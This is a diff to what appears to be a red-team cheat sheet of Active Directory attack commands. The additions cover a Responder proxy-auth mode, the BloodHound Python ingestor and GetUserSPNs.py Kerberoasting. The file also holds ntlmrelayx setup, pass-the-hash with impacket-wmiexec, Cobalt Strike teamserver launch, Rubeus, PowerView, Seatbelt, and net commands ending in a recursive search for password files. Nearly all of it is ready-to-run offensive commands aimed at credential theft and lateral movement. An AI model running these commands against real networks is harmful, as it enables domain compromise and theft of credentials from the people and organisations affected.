@@ -30,6 +30,7 @@ Full - nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-
 Responder -
 Analysis Mode - python Responder.py -I <interface> -A
 Business Mode - python Responder.py -I <interface> -r -d -w
+Business Mode Proxy Auth - python Responder.py -I <interface> -P -v -r
 
 Relayx -
 DISABLE SMB and HTTP in: /usr/share/responder/Responder.conf
@@ -60,7 +61,7 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 
 **CS**
 --------------------
-- ./teamserver <ip> <password> 2019-MM-DD /path/to/C2/c2.profile
+- ./teamserver <ip> <password>  /path/to/C2/c2.profile 2020-MM-DD
 
 **BloodHound**
 --------------------
@@ -71,6 +72,13 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 - powerpick Invoke-BloodHound --CollectionMethod All
 - Download Bloodhound.zip
 
+**BloodHound - Python Ingestor**
+--------------------
+- git clone https://github.com/fox-it/BloodHound.py
+- cd /BloodHound.py
+- python setup.py install
+- python bloodhound.py -d <domain> -u <user> -p <password> -dc <DC-FQDN> -gc <GC-FQDN> -ns <DNS-Server-IP> -c All,Session -v 
+
 ## Inveigh ##
 - powershell-import inveigh.ps1
 - powerpick Invoke-Inveigh ConsoleOutput Y
@@ -78,6 +86,9 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 ## Kerberoast ##
 - powershell-import autokerberoast.ps1
 - powerpick invoke-autokerberoast -Groupname "*admin*"
+
+## GetUserSPNs.py ##
+- python GetUserSPNs.py -request -dc-ip <DC-IP> <Domain>/<Username> -outputfile hashcat -debug
 
 ## Rubeus ##
 - execute-assembly /path/to/rubeus.exe kerberoast /outfile:hashes.txt /format:hashcast
@@ -89,12 +100,12 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 - powerrpick Invoke-UserHunter -UserName "<username>" (/opt/PowerSploit/Recon/PowerView.ps1)
 
 ## Seatbelt ## 
-- execute-assembly /root/Desktop/Seatbelt.exe InterestingFiles
+- execute-assembly /root/Desktop/Seatbelt.exe All
 
 **Shell Commands**
 - shell net use
 - shell net user <user> /domain
-- shell net localgroups "<groupname>"
+- shell net localgroup "<groupname>"
 - shell net group "Domain Admins"
 - shell net group "<group>" /domain | find /I "<name>"
 - shell dir /s /b *passw*.*
